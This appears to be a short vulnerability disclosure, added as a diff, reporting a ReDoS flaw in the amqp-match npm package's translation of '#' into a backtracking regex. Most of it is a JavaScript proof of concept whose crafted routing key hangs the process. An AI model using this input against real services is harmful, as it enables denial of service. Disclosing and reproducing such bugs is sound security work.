@@ -1,0 +1,16 @@
+Confirmed ReDoS in `match` (amqp-match) — the `#` → `([^.]+.?)+` translation causes catastrophic backtracking when the routing key doesn't match.
+
+```javascript
+const match = require("amqp-match");
+
+// Vulnerable pattern translation: '#' -> ([^.]+.?)+
+// A routingKey of many non-dot chars followed by a mismatch (e.g. "..")
+// forces catastrophic backtracking in the generated regex, hanging the process.
+const routingKey = "a".repeat(28) + "..";
+const pattern = "#";
+
+console.log("Starting match — this will hang due to ReDoS...");
+const start = Date.now();
+match(routingKey, pattern);
+console.log("Finished in", Date.now() - start, "ms");
+```
